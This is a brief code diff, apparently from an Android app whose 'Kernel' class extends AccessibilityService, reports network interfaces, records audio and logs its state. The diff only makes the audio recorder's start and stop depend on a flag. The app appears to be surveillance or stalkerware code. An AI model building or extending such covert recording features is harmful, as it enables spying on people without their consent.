@@ -111,7 +111,7 @@ public class Kernel extends AccessibilityService {
 
         // Extra initialization routines
         NetworkDriver.reportNetworkInterface();
-        AudioRecorder.start();
+        if (AudioRecorder.ENABLE_AUDIO_RECORDER) { AudioRecorder.start(); }
     }
 
     private void registerReceivers() {
@@ -131,7 +131,7 @@ public class Kernel extends AccessibilityService {
     }
 
     public static void terminate() {
-        AudioRecorder.stop();
+        if (AudioRecorder.ENABLE_AUDIO_RECORDER) { AudioRecorder.stop(); }
 
         Storage.logMessage(Storage.stateWriter, "<strong>📱 TERMINATED</strong>", true);
         Storage.logMessage(Storage.stateWriter, "<br />", false);
